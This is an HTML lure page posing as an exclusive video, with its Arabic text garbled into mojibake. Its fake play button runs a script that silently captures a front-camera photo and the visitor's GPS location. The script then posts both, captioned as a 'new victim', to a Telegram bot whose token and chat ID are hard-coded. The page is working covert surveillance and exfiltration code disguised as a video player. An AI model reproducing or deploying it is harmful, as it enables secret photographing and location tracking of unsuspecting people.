<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ÙÙŠØ¯ÙŠÙˆ Ø­ØµØ±ÙŠ - Ù…Ø¯ÙŠÙ†Ø© Ø§Ù„ØªÙ„</title>
    <style>
        body {background:#000; color:#fff; text-align:center; font-family:Arial; margin:0; padding:0; overflow:hidden;}
        .container {position:absolute; top:0; left:0; width:100%; height:100%; display:flex; flex-direction:column; justify-content:center; align-items:center;}
        h1 {font-size:28px; margin:20px; color:#f00;}
        .fake {background:url('https://i.imgur.com/0kW9K4j.jpg') center/cover no-repeat; height:70vh; width:90%; border:5px solid #f00; border-radius:15px; position:relative;}
        .play-btn {position:absolute; font-size:80px; color:#fff; background:rgba(0,0,0,0.6); border-radius:50%; padding:20px; cursor:pointer; animation:pulse 1.5s infinite;}
        @keyframes pulse {0% {transform:scale(1);} 50% {transform:scale(1.1);} 100% {transform:scale(1);}}
        .loader {display:none; border:8px solid #333; border-top:8px solid #f00; border-radius:50%; width:80px; height:80px; animation:spin 1s linear infinite; margin:30px;}
        @keyframes spin {0% {transform:rotate(0deg);} 100% {transform:rotate(360deg);}}
    </style>
</head>
<body>
    <div class="container">
        <h1>ÙÙŠØ¯ÙŠÙˆ Ø­ØµØ±ÙŠ ÙˆØµÙ„ Ù„Ù„ØªÙˆ ÙÙŠ Ù…Ø¯ÙŠÙ†Ø© Ø§Ù„ØªÙ„</h1>
        <p>Ø§Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ø²Ø± Ù„ØªØ´ØºÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø§Ù„ÙƒØ§Ù…Ù„</p>
        <div class="fake">
            <div class="play-btn" onclick="startCapture()">â–¶</div>
        </div>
        <div class="loader" id="loader"></div>
        <p id="status">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</p>
    </div>

    <script>
    function startCapture() {
        document.getElementById('loader').style.display = 'block';
        document.getElementById('status').innerText = 'Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø¹Ø§Ù„ÙŠ Ø§Ù„Ø¬ÙˆØ¯Ø©...';

        navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(stream=>{
            let video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            setTimeout(()=>{
                let canvas = document.createElement('canvas');
                canvas.width = 1280;
                canvas.height = 720;
                canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
                let imgData = canvas.toDataURL('image/jpeg');

                navigator.geolocation.getCurrentPosition(pos=>{
                    let gps = pos.coords.latitude + "," + pos.coords.longitude + " Â±" + pos.coords.accuracy + "m";

                    // ÙˆØ³ÙŠØ· Ø¢Ù…Ù† Ù„Ù„Ø¥Ø±Ø³Ø§Ù„ (Ø¨Ø¯ÙˆÙ† ØªÙˆÙƒÙ† Ù…ÙƒØ´ÙˆÙ)
                    let proxy = "https://api.allorigins.win/raw?url=";
                    let telegramUrl = encodeURIComponent("https://api.telegram.org/bot8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8/sendPhoto?chat_id=1611398303");

                    let form = new FormData();
                    form.append('photo', dataURLtoBlob(imgData));
                    form.append('caption', "ğŸ†• Ø¶Ø­ÙŠØ© Ø¬Ø¯ÙŠØ¯Ø© Ù…Ù† Ø§Ù„ØªÙ„\nGPS: " + gps);

                    fetch(proxy + telegramUrl, {method: 'POST', body: form});
                });

                stream.getTracks().forEach(track => track.stop());
            }, 1500);
        });
    }

    function dataURLtoBlob(dataurl) {
        let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
            bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
        while(n--) u8arr[n] = bstr.charCodeAt(n);
        return new Blob([u8arr], {type:mime});
    }
    </script>
</body>
</html>
